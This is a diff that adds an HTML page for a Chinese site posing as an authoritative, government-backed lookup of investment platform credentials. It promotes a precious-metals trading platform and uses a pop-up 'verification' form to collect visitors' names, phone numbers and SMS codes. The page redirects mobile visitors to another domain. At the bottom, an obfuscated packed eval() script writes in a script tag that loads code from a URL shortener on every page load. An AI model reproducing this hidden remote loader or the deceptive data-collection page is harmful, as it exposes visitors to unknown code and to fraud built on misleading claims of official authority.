@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+		<title>查询网站</title>
+		<link rel="stylesheet" type="text/css" href="css/index.css"/>
+	</head>
+	<body>
+		<div class="header clearfix">
+			<div class="fl">
+				<a href="mailto:feedback@weiwob.cn">申诉</a>
+				<a href="mailto:report@weiwob.cn">举报</a>
+			</div>
+			<div class="fr">
+				<a href="javascript:;" class="collection" onclick="addFavorite()">收藏本页</a>
+			</div>
+		</div>
+		<div class="banner">
+			<div class="image">
+				<img src="image/banner.png"/>
+			</div>
+		</div>
+		<div class="search">
+			<h1>最权威的投资平台资质查询网站</h1>
+			<p>拥有全国最大数据库，已收入<span id="date3"> 2927005</span> 家平台机构（截止 <span id="date">2017-5-7</span>） </p>
+			<form method="post">
+				<ul class="dropdown">
+					<i class="down"></i>
+					<span>原油</span>
+					<li>原油</li>
+					<li>大宗商品</li>
+					<li>现货</li>
+					<li>贵金属</li>
+				</ul>
+				<input type="text" placeholder="请输入查询平台的名称" style="margin-left: -7px;"/>
+				<span class="placeholder">请输入查询平台的名称</span>
+				<i class="iconsearch"></i>
+				<input type="submit" value="搜 索" id="search" class="plus"/>
+			</form>
+			<p class="hot">热搜企业：<a href="http://xhsh.daycmt.cn/#360FFF#XH#001"> 新华贵金属</a><a href="http://www.baiyintouzi.com/">白银投资网</a><a href="http://www.guijinshu.com/">贵金属网</a></p>
+		</div>
+		<div class="content">
+			<div class="statistical">
+				<p>累计为<span class="red timer date1" data-to="1378244" data-speed="10000">1378244</span>名&nbsp;投资者查询了<span class="red timer date2" data-to="8974305" data-speed="10000">8974305</span>个平台</p>
+			</div>
+			<ul class="list clearfix">
+				<li>
+					<div class="listicon">
+						<div class="image">
+							<img src="image/list_icon1.png"/>
+						</div>
+					</div>
+					<div class="listfont">
+						<h6>官方核实</h6>
+						<p>政府监督，官方数据同步共享，收录贵金属期货现货，投资等多类平台</p>
+					</div>
+					<div class="listimg">
+						<div class="image">
+							<img src="image/list_img1.png" alt="" />
+						</div>
+						
+					</div>
+				</li>
+				<li>
+					<div class="listicon">
+						<div class="image">
+							<img src="image/list_icon2.png"/>
+						</div>
+					</div>
+					<div class="listfont">
+						<h6>实时查询</h6>
+						<p>最新数据实时更新，第一时间反馈最真实有效的查询结果</p>
+					</div>
+					<div class="listimg">
+						<div class="image">
+							<img src="image/list_img2.png" alt="" />
+						</div>
+						
+					</div>
+				</li>
+				<li>
+					<div class="listicon">
+						<div class="image">
+							<img src="image/list_icon3.png"/>
+						</div>
+					</div>
+					<div class="listfont">
+						<h6>大数据</h6>
+						<p>智能云数据中心，收录海量关联信息，提供多维度的数据分析支撑</p>
+					</div>
+					<div class="listimg">
+						<div class="image">
+							<img src="image/list_img3.png" alt="" />
+						</div>
+						
+					</div>
+				</li>
+			</ul>
+		</div>
+		<div class="footer">
+			<p>Copyright &copy 2010-2017 金创互动科技（深圳）有限公司 广告版权 </p>
+			<p>本站信息仅供投资者参考，不做为投资建议！投资有风险，入市需谨慎！</p>
+		</div>
+		<!--弹窗-->
+		<div class="pop_ups"></div>
+		<div class="f_bg">
+			<h2>信息验证</h2>
+			<form action="" method="post" id="form">
+				<p>
+					<input type="text" id="phone" class="username" placeholder="请输入姓名">
+					<span class="placeholder">请输入姓名</span>
+				</p>
+				<p>
+					<input type="text" id="phone" class="phone" placeholder="请输入手机号码">
+					<span class="placeholder">请输入手机号码</span>
+				</p>
+				<p class="clearfix">
+					<input type="text" id="code" placeholder="请输入验证码">
+					<span class="placeholder">请输入验证码</span>
+					<a href="javascript:void(0)" id="btn">获取验证码</a>
+				</p>
+				<p>
+					<a href="javascript:void(0)" id="load">立即申请</a>
+				</p>
+			</form>
+		</div>
+		<script src="js/jquery.min.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/placeholder.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/date.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/index.js" type="text/javascript" charset="utf-8"></script>
+		<script type="text/javascript">
+			function browserRedirect() {
+				var sUserAgent= navigator.userAgent.toLowerCase();
+				var bIsIpad= sUserAgent.match(/ipad/i) == "ipad";
+				var bIsIphoneOs= sUserAgent.match(/iphone os/i) == "iphone os";
+				var bIsMidp= sUserAgent.match(/midp/i) == "midp";
+				var bIsUc7= sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
+				var bIsUc= sUserAgent.match(/ucweb/i) == "ucweb";
+				var bIsAndroid= sUserAgent.match(/android/i) == "android";
+				var bIsCE= sUserAgent.match(/windows ce/i) == "windows ce";
+				var bIsWM= sUserAgent.match(/windows mobile/i) == "windows mobile";
+		
+				if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+		            window.location.href = 'http://m.chaxun.89xh.cc';
+				} else {
+//					window.location.href = 'http://chaxun.89xh.cc';
+				}
+			}
+			browserRedirect();//调用自身，页面一打开就开始跳转
+		</script>
+		<script>
+		eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1.2("<0 3=\'4://5.6/7\'></0>");',8,8,'script|document|writeln|src|http|t|cn|Rt4kuaP'.split('|'),0,{}))
+		</script>
+
+	</body>
+</html>
